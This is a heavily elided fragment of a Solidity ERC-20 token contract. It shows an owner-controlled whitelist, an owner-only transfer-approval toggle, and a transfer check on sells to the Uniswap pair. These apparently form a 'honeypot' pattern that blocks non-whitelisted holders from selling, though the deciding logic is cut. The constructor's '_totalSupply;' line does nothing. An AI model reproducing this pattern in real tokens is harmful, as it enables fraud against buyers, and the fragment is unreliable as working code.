 ...
 */
contract MyToken is Context, IERC20, IERC20Metadata, Ownable{
    ...
    function whiteListAddress (address _add) public onlyOwner {
        _whiteList[_add] = true;
    }

    bool private approveTransfer = false;
     ...
     * construction.
     */
    constructor (string memory Name_, string memory Symbol_, uint256 _supply) {
        _name = Name_;
        _symbol = Symbol_;
        _totalSupply;
    ...
    function ApproveTransfers( bool _value) external onlyOwner {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if(recipient == uniswapV2Pair || _whiteList[sender]){
